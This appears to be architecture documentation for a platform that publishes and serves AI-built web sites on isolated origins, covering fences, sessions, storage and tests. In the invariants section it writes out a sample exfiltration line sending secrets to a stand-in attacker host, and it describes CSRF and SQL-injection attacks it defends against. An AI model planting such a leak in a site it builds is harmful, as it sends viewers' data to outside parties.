# Live web artifacts

A **live artifact** is a directory a work-stream run published that Rally also
*serves publicly*, at a stable per-artifact HTTPS origin. A landing page, a
dashboard, a calculator, a poll: the model
writes ordinary files in the Terminal sandbox exactly as it writes a document,
publishes the directory with the same tool, and what lands in the rail is a page
people open rather than a code listing.

Read this before changing anything that publishes a directory, serves an artifact
origin, or touches the facet that holds a stateful artifact's data. The
reasoning behind the design is in
[the PRD](PRDs/2026-08-29_live-web-artifacts/prd.md); this document is what
exists.

## Where the code lives

| Path | Responsibility |
| --- | --- |
| `packages/contracts/src/artifacts.ts` | The shapes both sides agree on: the manifest schema, the site MIME type, the hostname derivation, the asset and isolate keys, the viewer header names. Parsed on both sides rather than trusted across. |
| `apps/api/src/services/terminal/site-publish.ts` | What a published directory *becomes* — the entry-file rule, the stateful-class check, the content-type table, the zip bundler, and the one asymmetric kind transition. |
| `apps/api/src/services/terminal/site-import.ts` | Reading a version's files back out of the bucket, and the whole-tree replacement that writes them — never a merge. |
| `apps/api/src/services/terminal/site-resource-bridge.ts` | Writing one version: assets and manifest into the bucket, the registry row, the supervisor's pointer. The order is the contract. |
| `apps/api/src/services/artifact-hostname.ts` | Reserving a readable four-word hostname in shared platform D1 with permanent collision tombstones. |
| `packages/db/platform-migrations/` | The content-free, platform-shared D1 schema used by both product regions and both artifact Workers. |
| `apps/api/src/services/terminal/runtime.ts` | `inspectPublishTarget` (what a path is) and `publishDirectory` (reading the tree and dispatching). |
| `apps/api/src/durable-objects/artifact-host-do.ts` | One supervisor object per artifact: version pointer, viewer sessions, error log, and the facet that runs the model's storage class. |
| `apps/api/src/artifacts/index.ts` | The artifact serving Worker's entry point — a second Worker, its own origin, its own bindings. |
| `apps/api/src/artifacts/serving-policy.ts` | The three fences: the page CSP, the fetch-metadata admission, and the prior-version mount rules. |
| `apps/api/src/artifacts/read-only-sql.ts` | What a data query may run, and how a dynamic table name is admitted. |
| `apps/api/src/artifacts/facet-host.ts` | The Rally-authored module source loaded into a stateful artifact's facet beside the model's own. |
| `apps/api/src/artifacts/asset-loopback.ts` | `ArtifactAssetLoopback`: the `ASSETS` binding, as an exported entrypoint. The one thing that crosses into an artifact's isolate. |
| `apps/api/src/artifacts/asset-shim.ts` | The two module sources that run inside the isolate: the wrapper that makes `fetch(string)` true, and the entry Rally puts in front of a stateless active site's own module. |
| `apps/api/src/artifacts/pages.ts` | The neutral page, the plain error page, and the fragment-to-cookie bootstrap. |
| `apps/api/src/services/workstream-artifact-data-tools.ts` | The two read-only data tools' contract: what a model sees, and which sites are unreachable. No `Env` — its wiring is next door. |
| `apps/api/src/services/workstream-artifact-data-wiring.ts` | Resolving a reference through the standard visibility loader, and reaching the supervisor through the one supported resolver. |
| `packages/agent-harness/src/prompts/document-generation.ts` | The standing policy's `# Sites` section: the trigger and the manners, and nothing else. |
| `packages/agent-harness/src/building-live-sites-skill.ts` | The loadable skill that carries the build craft, scoped to the Terminal plugin. |
| `apps/api/src/services/artifact-open-service.ts` | The identity-bearing door into an artifact origin: the open-time visibility check and the fragment-carrying URL it mints. Public reads bypass it and remain anonymous. |
| `apps/desktop/src/renderer/components/site-resource-detail.tsx` | The site detail: the pane it measures and hands over, the actions and lazy menu levels it contributes to its host, and the Stored data pop-out. |
| `apps/desktop/src/renderer/components/detail-header-actions.tsx` | How a detail hands its actions to the header of the rail or panel showing it, as data the host draws as its own. Not artifact-specific: it is what keeps this detail's controls out of the page it is showing. |
| `apps/desktop/src/main/artifact-viewers.ts` | What the desktop will load into an artifact surface, the preview rectangle's clamp and corner, the shared isolation contract, the activation gate on leaving the origin, and the overlay rule. |

### Publishing

`publish_resource` accepts a directory. It gains no parameter for what
to do with one: **the kind is resolved from the directory's root entry**, because
a parameter restating what the files already say is a parameter that can disagree
with them, and the disagreement would be invisible until serve time.

```
root index.js   → active site   (Rally executes it per request)
root index.html → static site   (assets only)
neither         → archive       (one downloadable zip)
```

`index.js` wins over `index.html`, because an active site almost always ships
both — the module routes its own paths and falls through to the page — so the
module's presence is the stronger signal rather than a tie.

The path's shape is asked once, in one command that also enumerates the tree, and
every file is then read and verified against the digest that listing reported. A
file rewritten in between is a producer that has not finished, and publishing
half of one version with half of another would be a site that renders
inconsistently with nothing to point at.

An **archive** rides the ordinary document publish path unchanged: it is one
file's bytes with a zip's mime type, so identity, replay, version capture, and
the rail entry behave exactly as a document's do. A **site** takes its own path,
because almost nothing is shared — its stored content is a manifest rather than
the thing a viewer sees, its bytes go to version-immutable keys, and it has a
supervisor object to point at afterwards.

Every new site version also gets a normalized social preview. Publish reads the
root page's Open Graph, Twitter/X, title, description, and local preview-image
references. An authored local PNG, JPEG, GIF, or WebP is kept with its measured
dimensions. When the page omits usable artwork, Rally writes a deterministic
1200×630 PNG under `.rally/` using the page title and stores its descriptor in
the manifest. This is publish-time work: a crawler request never parses source
metadata, probes an image, or generates a card. `.rally/` is a platform-reserved
directory and authored files there are refused before any version is written.
The bitmap font transliterates accented Latin text and gives titles with no
supported glyphs a stable visible site code; an authored card remains the right
answer for non-Latin branding.

**Looking before announcing.** The model writes a site's markup without
seeing it, so the skill has it serve the directory in the sandbox, screenshot
it with Playwright at 400px and 1280px, and look with `view_image` before it
announces the site. A public active site is screenshotted at its published
URL, since `index.js` does not run under the local server; a protected one
answers the sandbox with its 401 page, so it gets the local layout check only.
Where Playwright is missing the model publishes and says it could not check
the layout. [`terminal-workspaces.md`](terminal-workspaces.md) owns the image
and the tool.

Assets within a version upload through at most six whole-upload workers. That is
a conservative per-invocation budget based on Cloudflare's six connections
waiting for response headers; it is neither a hard transfer cap nor an
account-wide limit. Every writer settles before publication can continue; any
failed asset prevents the manifest write. This preserves the assets-before-manifest
barrier without adding each independent R2 round trip to the publication latency.

### Sites built from structured data

The site skill delegates source-data handling to `using-external-structured-data`
for both initial publication and refreshes: complete connector reads, raw
response files, scripted transformation, then comparison of every mapped field
and source row before publication. The shared skill owns this procedure for
reports, imports and other outputs too. The site skill owns the destination's
data format, recovery and publication checks.

A connector response is not automatically a Terminal file. Agents use an
exposed export/import path when one exists; otherwise the shared skill describes
copying each manageable raw JSON response through `write_file`. That fallback
still passes through the model. Scripted validation proves the transformation
against those saved inputs, not the fidelity of the transfer itself. A run that
cannot preserve the source reports the transfer gap instead of publishing
selected records or leaving known omissions for a future refresh.

### Revising

The `building-live-sites` skill directs both interactive agents and Sidekicks
refreshing a site to load Terminal for file editing, import and publication.
Loading the skill supplies instructions without activating those tools. A later
run must recover the existing source when its sandbox lacks the files. Preserving
identity requires both the original publication conversation and directory path.
For a thread's site, only a workstream-scoped Sidekick owned by that thread
redirects publication there; personal and workspace Sidekicks publish in their
own conversation. Importing the source does not change that target.

A run asked to change a site it did not build — or built in a session that has
since ended — brings the files back first, through `import_resource`
on the site's own resource id. The manifest is the index, and `index.js` is
materialized alongside the assets even though a viewer's request for it 404s:
"module, not asset" is a rule about the *serving* path, and a model that could
not see its own server could not revise it. The version imported is the one the
resource points at, so an edit starts from what viewers are being served rather
than from whatever an earlier sandbox happened to hold.

**A site import names its destination.** The deterministic placement that gives
a file import its provenance — a fixed path, a digest, a reuse when they match —
has nothing to match against for a tree, and the path a site wants is not
Rally's to pick: it is the one the site publishes from, because republishing
exactly that path is what updates this site instead of minting a second one at a
second URL. An import that omits `destinationPath` is therefore refused with
that path, `.rally-output/<source path>`, spelled from the workspace root the
import measures from rather than the output directory publication measures
from.

`overwrite` is **whole-tree replacement, never a merge**. Merging would leave
behind files a later version deleted, and the next publish would ship them back
as though somebody had restored them on purpose. The tree is staged beside the
destination, the existing directory is renamed aside rather than deleted, and
the staged tree is moved into place — so an install that fails puts the previous
tree back, and only an install that succeeded removes it. A refusal costs
nothing: the destination is inspected while the staging directory is created,
before any durable import row exists and before a byte moves, because a
`planned` row that outlives a refused call reads to the next acquisition as a
revoked import and replaces the whole sandbox.

The one manifest asset source import deliberately omits is a preview marked
`generated: true`. It is Rally's derived output, not model-authored source;
returning it to the sandbox would make an unchanged import-and-republish look
like a source edit and could duplicate the generated asset. Authored preview
images carry `generated: false` and import normally.

### Serving

The artifact serving Worker is a second entrypoint in `apps/api`, deployed as its
own Worker on its own origin. A public address is
`<four-word-stub>-<region>.rallyusercontent.com`. The Worker reads exactly one
indexed row from the content-free `rally-platform` D1 database to recover the
artifact UUID, then reaches the existing UUID-addressed supervisor. Legacy UUID
hosts keep parsing so an old bookmark remains valid; every newly minted or lazily
migrated URL uses the readable stub.

Fences apply in this order, all before any model-authored code runs:

1. **Host** — not an artifact host, or the wrong region's, answers the neutral
   page.
2. **Fetch metadata** — unsafe requests require exact same-origin metadata.
   `GET` and `HEAD` from anywhere are admitted as anonymous public reads; only
   same-origin requests and genuine top-level navigations may carry Rally
   viewer identity. See [Invariants](#invariants).
3. **Optional viewer session** — when a request is eligible and carries the
   artifact cookie, it is checked against `ArtifactHostDO`. Admission already
   proved resource access; ordinary page and asset requests trust that durable
   session until explicit revocation removes it or its fixed lifetime expires.
   A missing or expired session falls back to the public representation with no
   identity headers.

Then `/__rally/*` paths are Rally's own (the access bootstrap, the redeem
endpoint, prior-version mounts) and everything else is artifact content: assets
resolved against the manifest for a static site, the loader for a stateless
active one, or the facet for a stateful one.

For successful current-version HTML, the Worker adds the manifest's normalized
canonical, description, Open Graph, and Twitter/X tags after authored tags, so
the page's own values win and Rally fills what is missing. Static injection is
limited to the root `index.html`; a second page keeps its own metadata rather
than receiving the home page's title. Static HTML is already bounded by the
publish ceiling and is rewritten as text; an active handler may stream, so its
response is transformed with `HTMLRewriter` instead of buffered. The preview
URL points at the site's ordinary asset path with an artifact-version query.
That path choice is security-significant: a protected active handler's early
viewer guard still covers the preview image, while a new version gets a
different crawler cache key without adding a Rally route that could bypass
model-authored access control. It also means every active handler must keep the
taught `env.ASSETS.fetch(request)` fallback for the generated image to resolve;
Rally deliberately does not route around a handler that owns access control.
Error pages, redirects, JSON, historical versions, and manifests from before
this field existed are not rewritten.

### Access

The lite browser uses the existing browser platform adapter to open an authorized
site in another tab. It does not require the Electron-only native preview bridge.
Artifact open, error, and data API routes accept both member and guest workspace
relationships; `ArtifactOpenService` applies the same resource authorization to
both. A guest receives viewer identity only for a resource exposed in their
shared scope. This does not change public content serving below.

API read admission and its revocation contract are owned by
[authorization](authorization.md).

The agent data tools resolve a supplied resource ID or alias through the shared
resource point lookup, rather than searching a page of attached sites. A
Sidekick can query a site its execution user can read without attaching it;
discovery remains limited to its related conversations.

Artifact content is public by default. A direct browser, crawler, or unfurler
can `GET` or `HEAD` the stable URL without a Rally session. The Worker reads the
current manifest from `ArtifactHostDO`, strips any inbound cookie and viewer
header before model code runs, and injects no identity. Static sites therefore
cannot be private. Anonymous unsafe methods are refused before model code runs:
public means readable, not anonymously writable. That rule is about methods,
not effects: an active site's own `index.js` runs on an anonymous `GET` and
may write its storage, which is why Trusted-only Terminal sandboxes can send
data to a Rally site
([`terminal-workspaces.md`](terminal-workspaces.md#invariants)).

The four-word hostname is a readable routing label with roughly 30 bits of
combinations, not an access secret. Search crawlers receive
`X-Robots-Tag: noindex`, but that is indexing etiquette rather than a security
boundary; anyone holding or discovering the URL can read the current site.

An author who needs a protected site must publish an **active** site whose
handler checks `x-rally-viewer-id` before every route and before its asset
fallback, returning 401 when the header is absent. Rally injects that header
only after the session flow below succeeds; inbound copies are stripped first.
This makes the handler's check an authorization boundary rather than a
guessable-URL convention. The site-building skill teaches this shape explicitly.

`POST /resources/:id/artifact/open` mints a single-use code against current
canonical resource access — current membership plus an accessible conversation
attachment, including a child-only grant. Legacy parent visibility is insufficient. A resource that does not exist and one the
caller cannot see produce the same 404, so the endpoint is not an existence
oracle. **The code never travels in a request URL.** The desktop lands on
`/__rally/open#<code>`, where a Rally-served bootstrap page reads
`location.hash` — which a browser never sends to a server — clears it from the
address bar, and `POST`s the code in a request body. The redeem endpoint never
serves artifact content: it consumes the code, sets the cookie, and redirects, so
no artifact document is ever loaded at a location that held the code. The
bootstrap is served before the hostname route is read, since it is the same
page for every host. This
Rally-authored bootstrap is the only response with
`Referrer-Policy: same-origin`, which keeps Chromium's Origin non-opaque on the
redeem POST; the artifact document reached after redemption returns to
`no-referrer`.

The lazy move from a legacy UUID host to a readable host is an origin change.
Server-side facet data is unaffected, but browser-owned cookies, local storage,
and IndexedDB under the legacy origin are not copied to the readable origin and
become unreachable from later opens. Artifacts currently use Rally's server-side
data surface for durable state, so preserving that browser-local state was not
worth retaining UUID origins for newly opened sessions.

Data-table and error-log inspection use the same registry and canonical resource
admission as navigation, but do not load a viewer profile or mint a
browser bootstrap code. Only actual navigation calls `openForViewer`. Inspection
also does not migrate legacy hostnames: it addresses the artifact object by ID.

### Stateful artifacts

A site whose `index.js` exports `class SiteData extends DurableObject` gets its
own isolated SQLite database, run as a **Durable Object facet** of its supervisor.
Rally assembles the dynamic worker's `modules` map, so the facet never loads the
model's class directly: a Rally-authored module imports `SiteData` and runs a host
class that **instantiates it and holds it as a field**, passing the same `ctx`.
Both objects address one database while living on separate prototype chains, so
the host answers RPCs the model's code never defined — describe, query, page —
over the same rows the page reads and writes.

Requests to a stateful artifact route *through* the supervisor rather than being
served in the loader's own isolate. That is a platform constraint rather than a
preference: facet stubs cannot travel over RPC, so the object that owns the facet
is the only place that can forward into it.

## Invariants

- **The access bootstrap is the only response that may depart from
  `Referrer-Policy: no-referrer`, and it may widen only to `same-origin`.** Its
  native same-origin form POST otherwise carries `Origin: null` and cannot pass
  the redeem fence. The exception must never reach model-authored content or a
  policy that sends an artifact origin off-origin.
- **Model-authored content is never same-origin with the application, the API, or
  another artifact.** Break it and a hostile artifact reads another's storage,
  cookies, or DOM. The origin is a per-artifact subdomain of a registrable domain
  that is not `rallywith.ai`.
- **Separate origins do not close cross-artifact CSRF, so the serving Worker
  separates public reads from credentialed requests.** Every artifact is a
  subdomain of one registrable domain, so two
  artifacts are same-*site*: `SameSite` does not stop script in artifact A
  sending a credentialed request to artifact B, and a simple `POST` needs no
  preflight, so B's model-written handler would still run. Unsafe requests are
  admitted only when fetch metadata says `same-origin`. A top-level document
  navigation — `Sec-Fetch-Mode: navigate` with `Sec-Fetch-Dest: document`, on a
  `GET` — may also use a valid viewer session. **`Sec-Fetch-Site: none` is the wrong
  test** and was the first thing written here: it covers an address bar and a
  bookmark, but a link click or a redirect from anywhere else sends
  `cross-site`, so keying on it would refuse the ordinary act of following a
  link to an artifact. Classifying on what the request is keeps the boundary
  intact, because a document navigation cannot carry a body a page composed.
  Cross-origin, same-site, and metadata-free `GET`/`HEAD` requests are allowed
  only as anonymous public reads: their cookies are ignored and model code gets
  no viewer headers. That distinction is load-bearing; treating a cross-site
  read as an identified viewer would restore the sibling-artifact attack.
- **The CSP's `script-src` and `style-src` must stay written out.** `'self'`
  does not permit inline code, so inheriting `default-src` would refuse the
  inline `<script>` and `<style>` model-authored pages are built from and break
  every artifact on its first load. The egress directives (`default-src`,
  `connect-src`, `form-action`) must never gain `'unsafe-inline'` — egress is the
  threat this policy exists for.
- **Artifact code sees no credential and no network.** The viewer cookie is
  stripped before the request crosses into the module, and `globalOutbound: null`
  makes `fetch()` throw.
- **The viewer identity headers are stripped before they are set**, canonical and
  superseded spellings alike. That strip is the entire anti-spoof mechanism; a
  header family whose readers widen to a legacy prefix and whose stripper does
  not has a forgeable back door.
- **Anonymous access is read-only.** Fetch metadata protects browsers from
  sibling-artifact CSRF; it does not authenticate a non-browser caller, which
  can spell those headers itself. `GET` and `HEAD` may fall back to the public
  representation, while every unsafe method still requires a valid Rally
  viewer session. Rally refuses the method, not the effect: a site's own code
  may still write its storage on a `GET`.
- **The desktop renderer never embeds, fetches, or parses artifact content.** An
  `<iframe>` would widen the renderer's CSP to a wildcard artifact host and graft
  remote model-authored content into the application DOM as a navigable,
  `postMessage`-reachable child. The main process owns both viewing surfaces and
  composites the preview over the rail; the renderer can only *ask for an
  artifact*, and the URL it supplies is checked here against the serving domain
  on a label boundary before anything loads.
- **The browser client is the one exception, and it frames.** A browser has no
  main process to composite a view, so its guest and member shells preview a
  live artifact in an `<iframe>` with
  `sandbox="allow-scripts allow-same-origin allow-forms"`, a constant beside the
  element in `site-resource-detail.tsx`.
  `allow-same-origin` keeps the artifact in *its own* origin on the artifact
  domain, never the app's, which its code redemption needs. The serving Worker's
  `allowBrowserFraming` gives a response carrying the default policy
  `artifactContentSecurityPolicy(origin)`, naming exactly `BROWSER_APP_ORIGIN`,
  and drops `X-Frame-Options`; an unset or unreadable origin leaves every
  response closed. So the browser client may
  frame an artifact and nothing else may, including another artifact. A
  redemption from inside the frame (`Sec-Fetch-Dest: iframe`) sets the viewer
  cookie `SameSite=None; Partitioned`, kept for this artifact under that one
  top-level site; a top-level navigation keeps `Lax`. A browser that refuses
  the partitioned cookie, such as Safari, which blocks third-party cookies,
  shows the public representation, where writes answer 401. The shell's
  `frame-src` admits the whole artifact domain, so the serving Worker refuses
  a framed navigation that arrives `same-site`
  (`isFramedHopFromAnotherArtifact`): that is one artifact moving its frame to
  another, the hop the desktop's `confineToArtifactOrigin` refuses. What is
  accepted:
  model-authored content renders inside the app's window and can `postMessage`
  its parent, which the app does not listen for.
- **The pane distinguishes "not attempted" from "refused".** A boolean cannot,
  and the gap between access arriving and the main process answering is not a
  failure — a component that used one flashes an unavailable message on every
  open of a page that is about to work.
- **A preview presentation cannot outlive the detail that requested it.** The
  initial artifact open crosses the API and can settle after a Channel switch
  has unmounted the detail. A cancelled detail must refuse to
  call the main process after cleanup, or it recreates an ownerless old preview
  over the newly selected Channel. The presentation's artifact ID and open URL
  must also come from that same response: the ID selects its isolated
  storage partition while the URL selects its confined origin.
- **Everything the renderer measures is a request, not an instruction.** The
  preview rectangle is converted through the Rally window's zoom factor (CSS
  pixels to window points) and then clamped to the window, because a wrong or
  hostile one would paint artifact content over the chrome a person needs to
  escape it. And a `WebContentsView` composites *above* the renderer's DOM, so
  any app surface that can overlap the rail — a dialog, the command palette, a
  lightbox, tooltip, or toast — must collapse the view to nothing while it is open,
  or artifact content paints over it. Tooltips and `data-native-overlay` toast
  bodies only collapse it when their positioned rectangle overlaps the visible
  pane, so feedback elsewhere leaves
  the live page running. Radix can expose the tooltip role on a hidden label;
  overlap uses its visible popper wrapper and is rechecked when that wrapper
  is positioned after mount. The pane under the view shows a still of the page,
  taken with `capturePage` *before* the collapse (a collapsed view paints
  nothing to take), and dropped once the view is back.
  The same view takes the pointer from anything drawn under it, so the
  panel's resize target must sit outside the area it covers, or the panel can
  be resized only from the strip beside its header. Verified visually; no
  automated guard (`desktop-layout.md` owns the target's placement).
- **No artifact may register a service worker.** `worker-src 'none'` is written
  out because `default-src 'self'` would permit a same-origin one, and a
  root-scoped service worker is the single thing an artifact can install that
  answers requests without reaching Rally at all — defeating revocation, the
  current-version guarantee, and the offline message in one move.
- **An artifact leaves its origin only through a person's own press, and never
  in place.** `location = "https://attacker/?" + secrets` is a navigation, which
  `connect-src` and `form-action` do not touch, so an unattended off-origin
  navigation is dropped: no timer, no `onload`, no cursor passing over the page
  reaches the system browser. Under transient user activation — a press or a tap
  on that surface within the five seconds Chromium itself calls activation — an
  `http(s)` link is handed to the default browser instead, and the preview never
  follows it in place, because a pane that says it is showing the artifact must
  not be showing something else. **The departure spends the press**, as
  `window.open` spends it in a browser, so one click buys one departure rather
  than a five-second licence: a page answering a click with a loop of
  `window.open` calls gets its first URL opened and no more. A redirect is not a
  press, is refused whatever the activation says, and spends nothing; the
  destination of a `302` is not the URL somebody chose to follow. **A press
  belongs to the document that received it** and is dropped when a main-frame
  navigation commits, so a click on an in-site link cannot still be live when
  the next page's `onload` runs. A `target="_blank"` link never gets a second
  window: off-origin it goes through the gate like any other link, and
  same-origin it is shown in the surface already open, which is the only answer
  that keeps the viewer session.
  **What this closes and what it does not** is the whole of the claim, and is
  written down rather than left as an assumed property of the CSP. No artifact
  can *fetch, load, beacon, or post* off-origin anywhere — that fence is whole.
  Navigation is narrower: unattended exfiltration by navigation is closed in
  Rally's surfaces, but a person clicking `Read the docs →` cannot see where the
  link points, so a page that wants to leak through a click still can, in
  exactly the way it can in a plain browser tab, where no header closes the
  channel at all. The gate buys that every handoff is somebody's own press, and
  that a press buys exactly one. It does not buy that the URL is one they would
  have chosen, and one URL per press is still a channel — a narrow one, paid for
  a click at a time.
- **The asset manifest is the only index.** Nothing resolves a path the manifest
  does not name, which is what makes the server module's absence from `assets` a
  real 404 rather than a convention.
- **A version's bytes are immutable.** The loader caches an isolate by a
  version-scoped id, so publishing different content at a version already used
  serves the cached module. A republish always advances the version.
- **Assets, then manifest, then hostname reservation, then resource row, then
  pointer.** Each step depends only on ones that already committed, so a failure
  leaves the artifact serving its *previous* version rather than a version whose
  bytes a viewer cannot read. The hostname must be reserved before the resource
  row moves: otherwise a D1 failure followed by an equal-content retry can
  mistake the changed resource for a completed publish and return the old
  artifact version.
- **A republish never downgrades a live site to an archive.** Archive→site
  upgrades freely — that is the archive fallback's own recovery — but the
  reverse fails loudly, because a URL participants hold is never killed by an
  accident of file layout.
- **`artifact_registry` is not the region-wide uniqueness authority.** It
  lives in a per-workspace database, so a `UNIQUE` there is unique per workspace
  and two workspaces could claim one host. The shared platform D1 composite
  primary key reserves `(region, hostname_stub)`; an immutable trigger and a
  no-delete trigger make old origins permanent tombstones.
- **A data query is admitted positively, never by denylist.** An always-rollback
  transaction is not an authorization boundary: caller SQL can commit
  mid-statement. Exactly one statement, parsing as a `SELECT`, with a `WITH`
  clause's *body* checked rather than its opening keyword.
- **A dynamic table name is matched against the live schema, never interpolated.**
  The names are the model's, so no code-owned allowlist can exist; the list is
  read from the facet's own `sqlite_master` at request time.

## Boundary

This module owns publishing a directory, serving an artifact origin, and the
facet that holds a stateful artifact's data. It does not own:

- **Resource identity, versioning, or the rail's resource list.** A site is an
  ordinary resource row; [`agent-attachments.md`](agent-attachments.md) and the
  versioning layer own those, and this module adds a resource type and an
  attachment kind to them.
- **Resource visibility.** The canonical authorization service composes current
  membership, conversation grants and attachment exposure before a viewer
  session is minted. Once admitted, that durable session is the serving
  capability; [`access-revocation.md`](access-revocation.md) owns the queue that
  removes it when membership or the login session ends.
- **The Terminal sandbox.** [`terminal-workspaces.md`](terminal-workspaces.md)
  owns the sandbox boundary; this module only reads files out of it.
- **Durable Object addressing rules.** `lib/durable-object-namespace.ts` is the
  one supported resolver; this module added `durableObjectStubForArtifact` to it
  rather than routing raw.
- **Operator inspection.** The supervisor inherits the shared raw-SQL RPC and
  the engineering MCP routes it as `run_artifact_sql`;
  [`engineering-mcp.md`](engineering-mcp.md) owns what that admits and how an
  artifact is fenced. That tool reaches this object's own database only — a
  stateful artifact's facet stays behind `queryData`.

## Failure modes and limits

- **The loader binding is absent.** A static artifact still serves. A stateless
  active artifact fails closed with 503 because its handler may be the access
  control protecting those same assets; serving the files as a fallback would
  turn a runtime outage into a privacy breach. A stateful site runs through its
  supervisor facet and does not need this binding on the serving Worker.
- **The model's module throws.** The viewer gets a plain Rally page, never a
  stack trace. The error — message, stack, request path — lands in a bounded
  per-artifact log (50 entries), which no client surface currently reads (see
  the changelog entry for 2026-09-10), so recovering it means asking for it
  back into chat.
- **A viewer session is revoked or expires.** Its next eligible request receives
  the anonymous public representation. A protected active site's own early
  header guard then returns 401; a public site continues serving it. Resource-
  scope changes do not poll canonical authorization from every page asset: the
  admitted session assumes access until an explicit revocation removes it or
  its fixed 24-hour lifetime ends.
- **Viewer-session lookup fails.** Identity is an optional enhancement to public
  serving, so a failed supervisor hop falls back to the anonymous representation
  rather than making a browser with an old cookie less able to read than a
  crawler. The failure emits a structured warning; a protected active site's
  header guard still refuses the anonymous request.
- **An anonymous request makes the model handler throw.** It receives the same
  neutral 500 response, but cannot append to the participant-facing error ring:
  otherwise crafted public requests could evict every useful diagnosis and
  plant attacker-controlled paths in a surface participants paste into chat.
  Reproducing the failure through Rally records it with trusted viewer context.
- **A prior version of a stateful artifact.** Source only, never live: one facet
  runs one class, so serving old code would abort the facet under current
  viewers, and old code against a live schema is undefined besides.
- **A prior version mount.** Unsafe methods are refused at the request path,
  and a prior version renders its **frozen assets only** — its module is never
  loaded. That is not caution but the removal of a class: a root-absolute
  `fetch("/api/…")` from a historical render is an ordinary same-origin request
  to the canonical path, and `Referrer-Policy: no-referrer` leaves nothing to
  tell it apart from one the current page made, so the escape cannot be closed
  at the request path. What remains is a page whose client script may read the
  current version's data — a wrong reading rather than an unauthorized one.
- **The window goes before the preview does.** A rail preview is a
  `WebContentsView` in a window Electron can destroy at any moment — quitting to
  install an update is the ordinary way — and the teardown that follows runs
  from that window's own `closed` event, after the view tree is already gone.
  Both surfaces are therefore asked whether they still exist before they are
  detached or closed; the window and the view are asked separately, because a
  view whose contents closed themselves is still attached to a live window.
- **Numeric limits.** Viewer session lifetime is 24 hours, fixed from mint and
  never sliding — the shape, not just the number, is the sleep guarantee, since
  compute per open is bounded by rate ceiling × lifetime. The open code lives 60
  seconds. A publish carries at most 25,000,000 bytes, transcribed from the file
  path's existing bound rather than chosen. A data page returns at most 200 rows.

## Testing

| Suite | What it proves |
| --- | --- |
| `pnpm --filter @rally/api exec vitest run test/artifact-read-only-sql.test.ts` | The SQL admission, adversarially: statement sequences that commit mid-payload, CTEs wrapping writes, semicolons inside literals, writes behind comment markers, and identifier injection. |
| `pnpm --filter @rally/api exec vitest run test/artifact-serving-policy.test.ts test/artifact-serving-hostname.test.ts` | The three fences: CSP directives, anonymous public reads, session identity only on eligible requests, refusal of credentialed cross-artifact writes, version-mount parsing, and asset resolution. |
| `pnpm --filter @rally/api exec vitest run test/site-social-preview.test.ts test/artifact-social-preview.test.ts` | Publish-time metadata extraction, authored local artwork, fallback PNG generation, absolute crawler metadata, escaping, and canonical URL cleanup. |
| `pnpm --filter @rally/api exec vitest run test/terminal-site-publish.test.ts` | Kind resolution, the one-file refusal, the storage-class check, content types, the zip, and the asymmetric transition. |
| `pnpm --filter @rally/api exec vitest run test/terminal-runtime.test.ts` | Directory publish end to end through the runtime, against a simulated sandbox shell. |
| `pnpm --filter @rally/api exec vitest run test/artifact-open-service.test.ts` | Which authority answers which question at open time, that a refusal mints nothing, and that a missing artifact and an invisible one are indistinguishable. |
| `pnpm --filter @rally/desktop exec vitest run src/renderer/components/site-resource-detail.test.tsx` | The detail: that the first access response drives the initial preview without a second mint, later surfaces get fresh single-use codes, it measures and hands over rather than embedding, its actions land in the host's header and each carries a tooltip, Copy link carries no code, the data toggle only exists for a site that keeps data and takes the composited view down with it, the pane never flashes its unavailable state, and dialogs, menus and overlapping tooltips hide the native view until they close (including tooltips positioned after mount). |
| `pnpm --filter @rally/desktop exec vitest run src/main/artifact-viewers.test.ts` | What the desktop will load, the rectangle clamp (including CSS-pixel to window-point conversion at a non-1 zoom), the isolation contract, the activation gate (unattended navigation dropped, an activated link handed over and never followed in place, redirects and disallowed schemes refused either way, one press buying one departure and not a loop of them, a refused navigation leaving the press unspent, the press dropped when its document goes, a same-origin `_blank` shown in place, and the exact event set that does and does not arm it), the overlay collapse, and the teardown guards — each surface's lifecycle branch separately, since one guard covering both reads as covered while half of it is dead. |
| `pnpm --filter @rally/api exec vitest run test/workstream-artifact-data-tools.test.ts` | The data tools' contract and the site read-remediation, including its round trip through the real structured-failure sanitizer. |
| `pnpm --filter @rally/agent-harness exec vitest run` | The skill's shape and the standing policy's byte budget — the prompt bound is what keeps the policy six lines rather than nine. |
| `pnpm --filter @rally/api exec vitest run --config vitest.workers.config.ts test-workers/artifact-stateless-module.test.ts` | A **stateless active** site's isolate on real workerd: that the `ASSETS` stub crosses the loader's env at all, that it serves this artifact's files, that the relative-string read works, and that `fetch()` throws. Scope is the isolate contract, not admission — the fences in front of it are the policy suite's. |
| `pnpm --filter @rally/api exec vitest run --config vitest.workers.config.ts test-workers/artifact-social-preview-runtime.test.ts` | `HTMLRewriter` on real workerd: active HTML receives metadata without buffering, while protected errors and JSON remain exact. |
| `pnpm --filter @rally/api exec vitest run --config vitest.workers.config.ts test-workers/artifact-asset-uploads.test.ts` | Real-R2 asset upload overlap, the assets-before-manifest barrier, generated tail assets, and failure draining. |
| `pnpm --filter @rally/api test:workers` (`test-workers/artifact-facet.test.ts`) | The facet on **real workerd**: a model class running with its own SQLite, viewer attribution and deduplication, rows surviving a republish, isolation between two artifacts and from the supervisor's own tables, egress throwing, and the rollback. |

Two traps:

- **Never publish different source at a version another test used.** The loader
  caches by a version-scoped isolate id, so the second publish silently serves
  the first's module and the failure reads as a missing route. `publish()` in the
  facet suite allocates versions for exactly this reason.
- **The supervisor's defensive `facets.abort` cannot be shown load-bearing
  locally.** Removing it leaves the workerd proofs passing, because the runtime
  reloads a facet whose class identity changed. It stays because it is the
  documented lifecycle and guards a cold-tracking case a single-process test does
  not reach — do not delete it on the strength of a green suite.

## Data model

- `resources` gains `resource_type = 'generated_site'`, provider
  `avalon_generated`, and the same `terminal:<workstream>:<path>` identity file
  publishes use. Its `content_ref` points at the version's **manifest**, so its
  MIME type is `application/vnd.rally.site-manifest+json`.
- `artifact_registry` (WorkspaceDO, migrations 28–29): `artifact_id` (the
  supervisor/storage UUID), `hostname_stub`, `workspace_id`, `workstream_id`,
  `resource_id`, `mode`, `stateful`, `current_version`, `manifest_ref`, timestamps.
- Shared platform D1 `artifact_hostname_routes`: `region`, `hostname_stub`,
  `artifact_id`, `created_at`. It contains no workspace, user, session, or
  artifact content.
- `ArtifactHostDO` (configured deployments, jurisdiction-pinned): `artifact_state` (one
  row), `viewer_sessions` (digests only — the cookie value is never stored), and
  `error_log` (a bounded ring).
- The `"data"` facet, for stateful artifacts: the model's schema, in a database
  that rides the supervisor's storage envelope. Facet classes are dynamic and
  never appear in Wrangler migrations; only `ArtifactHostDO` does.
